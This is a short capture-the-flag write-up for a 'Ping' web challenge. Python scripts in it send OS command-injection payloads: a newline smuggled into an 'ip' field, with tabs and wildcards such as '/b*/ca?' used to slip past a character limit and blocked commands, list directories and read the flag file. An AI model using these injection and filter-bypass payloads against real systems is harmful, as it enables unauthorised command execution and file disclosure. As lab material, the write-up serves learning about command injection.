# Ping #

## Intended Solution ##

### Restrict ###
* 15 Characters limit
* Blocked some system command
* Blocked some special characters

### Payload ###
* List directory
```python
import requests
payload = "\nls"
print requests.post("http://404.polyu.work:12337/Ping/", data={'ip':payload}).text
# index.php
```

* List parent directory
```python
import requests
payload = "\nls\t../"
print requests.post("http://404.polyu.work:12337/Ping/", data={'ip':payload}).text
# Ping comehereifyouwanttheflag error.log html
```

* List `../comehereifyouwanttheflag` directory
```python
import requests
payload = "\nls\t../c*"
print requests.post("http://404.polyu.work:12337/Ping/", data={'ip':payload}).text
# youneverreadthis
```

* Read `../comehereifyouwanttheflag/youneverreadthis`
```python
import requests
#payload = "\n/b*/ca?\t../c*/y*" <- this payload too long
payload = "\n/b*/ca?\t../*/*"
print requests.post("http://404.polyu.work:12337/Ping/", data={'ip':payload}).text
# flag{omg_you_finally_break_it}
```